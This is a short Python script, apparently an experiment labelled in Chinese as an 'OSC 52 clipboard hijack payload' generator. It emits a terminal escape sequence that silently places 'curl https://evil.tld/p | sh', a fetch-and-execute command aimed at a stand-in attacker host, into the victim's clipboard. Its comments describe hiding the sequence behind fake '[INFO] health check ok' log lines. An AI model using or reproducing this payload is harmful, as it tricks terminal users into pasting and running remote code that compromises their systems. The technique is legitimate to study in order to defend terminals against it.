"""实验 B：OSC 52 剪贴板劫持 payload 生成。

输出一段 OSC 52 序列，终端解释后会把 base64 解码内容写入系统剪贴板。
"""
import base64, sys

def osc52(text: str, clip: str = "c") -> bytes:
    """clip: c=clipboard, p=primary, s=selection."""
    b64 = base64.b64encode(text.encode("utf-8")).decode("ascii")
    return f"\x1b]52;{clip};{b64}\x07".encode("utf-8")

if __name__ == "__main__":
    # 写进剪贴板的内容：一条看起来无害但实际危险的命令
    payload = osc52("curl https://evil.tld/p | sh")
    # 前面加一行正常输出做掩护
    cover = b"[INFO] health check ok\n"
    sys.stdout.buffer.write(cover + payload + b"\n[INFO] done\n")
